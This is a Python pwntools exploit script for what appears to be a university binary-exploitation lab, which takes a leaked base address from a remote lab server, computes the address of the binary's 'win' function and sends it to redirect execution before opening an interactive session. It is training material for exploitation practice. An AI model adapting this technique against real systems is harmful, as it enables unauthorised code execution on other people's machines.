from pwn import *

# Load ELF 
e = ELF("./1-3_lab.bin")


#
# Step 1: Find Target Symbol
#
#    This step prints all symbol
#    names and their corresponding 
#    addresses found in the ELF binary. 
#    It is used to identify the target 
#    symbol for step 2.
#   

'''
# Uncomment to Print all Symbol Addresses
for eachName, eachAddr in e.symbols.items():
    print(" {:<38}  {:<8} {}{:>5}{} ".format(
    eachName,
    hex(eachAddr),
    "(", eachAddr, ")"))                    # Format and Print
'''

#
# Step 2: Exploit Vulnerability
#
#    This step establishes a connection 
#    to the remote server, calculates the 
#    base address, symbol address ('win'), 
#    and the absolute memory address of 
#    the symbol. It then exploits the 
#    vulnerability by sending the absolute 
#    address as a string to the server and 
#    starts an interactive session.
#  

''' Establish Connection to Server '''
# p = process("./1-3_lab.bin")              # Uncomment to Test Script Locally
p = remote("csc748.hostbin.org", 7013)      # Test Script Against Server

''' Obtain Base Address '''
p.readuntil('is ')                          # Read Output until Base Address
baseAddr_hex = p.read(14).decode('utf-8')   # Read and Convert Base Address
baseAddr_dec = int(baseAddr_hex, 16)        # Convert Base Address to Decimal
print("\n\n {:>22}  {:<17} {:>}{:>}{:>} ".format(
        "Base Address:",
        baseAddr_hex,
        '(', baseAddr_dec, ')'))            # Format and Print

''' Obtain Symbol Address '''
symbAddr_dec = e.symbols['win']             # Get Symbol Address
symbAddr_hex = hex(symbAddr_dec)            # Convert Symbol Address to Decimal
print(" {:>22}  {:<24} {:>4}{:>}{:>} ".format(
    "Symbol Address:",
    symbAddr_hex,
    '(', symbAddr_dec, ')'))                # Format and Print

''' Calculate Symbol Absolute Memory Address '''
absAddr = baseAddr_dec + symbAddr_dec
print(" {:>20}  0x{:<15x} {:>}{:>}{:>} \n\n".format(
    "Symbol Memory Address:",
    absAddr,
    '(', absAddr, ')'))                     # Format and Print

''' Exploit Vulnerability '''
p.sendline(str(absAddr))                    # Send Address as a String
p.interactive()                             # Start Interactive Session
